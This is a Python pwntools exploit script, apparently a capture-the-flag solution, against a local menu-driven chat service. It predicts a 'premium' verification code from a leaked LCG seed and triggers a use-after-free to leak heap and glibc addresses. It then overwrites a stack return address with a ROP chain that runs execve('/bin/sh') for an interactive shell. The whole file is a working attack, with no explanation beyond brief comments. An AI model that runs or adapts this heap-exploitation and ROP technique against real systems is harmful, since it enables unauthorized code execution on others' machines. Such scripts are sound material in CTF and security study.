#!/usr/bin/python3

import pwn
pwn.context(arch='amd64', os='linux', encoding='utf-8', log_level='warning')
io = pwn.remote("127.0.0.1", 1337)

def interact(prompt, response=None, verbose=False):
    pred = io.recvuntil(prompt)
    if verbose:
        print(pred, end="")
    if not response is None:
        io.sendline(response)
        if verbose:
            print(response)
    return pred

def chat(num, msg=None):
    interact("Enter your choice: ", "1")
    while True:
        interact("Employee #")
        pick = int(interact(":").decode('ascii').replace(":", ""))
        if pick==num:
            interact("(l/r/c): ", "c")
            variant = interact(["Send your first message", "the message is: "]).decode('ascii')
            if "Send your first message" in variant:
                if msg is None:
                    print("Error! chat() asked to get message from user that does not have one!")
                    print("Will send 'ERROR' instead")
                    msg = "ERROR"
                interact(": ", msg)
            elif "the message is: " in variant:
                if msg is None:
                    msg = interact("\nDo you want to edit the message? (y/n)")
                    msg = msg.replace(b"\nDo you want to edit the message? (y/n)", b"")
                    interact(": ", "n")
                else:
                    interact(": ", "y")
                    interact("Enter your new message: ", msg)
            interact("(l/r/c): ", "q")
            interact("Invalid direction.\n")
            return msg
        else:
            interact("(l/r/c): ", "l")

def gdpr():
    interact("Enter your choice: ", "4")
    interact("Enter your choice: ", "2")
    interact("Your data has been deleted.\n\n")
    return pwn.u64(io.recv(5)+b'\0\0\0')*4096

def rename(newname):
    interact("Enter your choice: ", "2")
    interact("Enter your new name: ", newname)

def mannheim_random(seed):
    return (0x5851F42D4C957F2D*seed+0x14057B7EF767814F)%(0x10000000000000000)

def premium(username):
    interact("Enter your name (8 chars): ", username)
    interact("Enter your choice: ", "3")
    interact("Enter your credit card number and we will send you a verification code: ", "0")
    interact("Enter the verification code: ", "0")
    interact("It should have been ")
    seed = int(interact(".").decode('ascii').replace(".", ""))
    verification_code = str(mannheim_random(seed))
    interact("Enter your choice: ", "3")
    interact("Enter your credit card number and we will send you a verification code: ", "0")
    interact("Enter the verification code: ", verification_code)

###################################################################################################

# Unlock premium
premium("myname")

# Trigger UAF, leak heap address
heap_base = gdpr()
print("heap_base: ", hex(heap_base))

# Create first message.
chat(1, 256*"A")

# Alloc & free a >0x408b chunk, putting it in largebins
chat(2, 0x421*"B")
chat(2, 0x431*"C")

# Leak main_arena pointer
main_arena_ptr = heap_base + 0x564f746f6940 - 0x564f746f5000
print("main_arena_ptr", hex(main_arena_ptr))
rename(pwn.p64(main_arena_ptr))
main_arena = pwn.u64(chat(1)+b'\0\0') - 1104
print("main_arena: ", hex(main_arena))

# Calculate other interesting glibc addresses
glibc_code = main_arena + 0x7f1389428000 - 0x7f138961ac80
print("glibc_code: ", hex(glibc_code))
glibc_rodata = main_arena + 0x7f13895bd000 - 0x7f138961ac80
print("glibc_rodata: ", hex(glibc_rodata))
glibc_rwdata = main_arena + 0x7f138961a000 - 0x7f138961ac80
print("glibc_rwdata: ", hex(glibc_rwdata))

# Get address of __libc_argv
libc_argv_ptr = glibc_rwdata + 0x7f0948a1ba20 - 0x7f0948a1a000
print("__libc_argv_ptr: ", hex(libc_argv_ptr))
rename(pwn.p64(libc_argv_ptr))
libc_argv = pwn.u64(chat(1)+b'\0\0') 
print("__libc_argv: ", hex(libc_argv))

# Calculate return address from menu_loop
return_from_menu_loop = libc_argv + 0x7ffeab9dab78 - 0x7ffeab9dacb8
print("ROP addr on stack: ", hex(return_from_menu_loop))

# Find gadgets
bin_sh = glibc_rodata + 0x7ff584bd8678 - 0x7ff584bbd000
print("/bin/sh: ", hex(bin_sh))
pop_rdi_gadget = glibc_code + 0x7ff584a2a3e5 - 0x7ff584a28000
print("pop_rdi gadget: ", hex(pop_rdi_gadget))
pop_rsi_gadget = glibc_code + 0x7ff584a2be51 - 0x7ff584a28000
print("pop_rsi gadget: ", hex(pop_rsi_gadget))
pop_rax_rdx_rbx_gadget = glibc_code + 0x7ff584a904a8 - 0x7ff584a28000
print("pop_rax_rdx_rbx_gadget: ", pop_rax_rdx_rbx_gadget)
syscall_gadget = glibc_code + 0x7ff584a29db4 - 0x7ff584a28000
print("syscall gadget: ", hex(syscall_gadget))

# Prepare ROP chain
rename(pwn.p64(return_from_menu_loop))
rop_chain = pwn.p64(pop_rdi_gadget)
rop_chain += pwn.p64(bin_sh)
rop_chain += pwn.p64(pop_rsi_gadget)
rop_chain += pwn.p64(0)
rop_chain += pwn.p64(pop_rax_rdx_rbx_gadget)
rop_chain += pwn.p64(59)
rop_chain += pwn.p64(0)
rop_chain += pwn.p64(0)
rop_chain += pwn.p64(syscall_gadget)
chat(1, rop_chain)

# Exit the main loop - get a shell
interact("Enter your choice: ", "5")
io.interactive()

io.close()
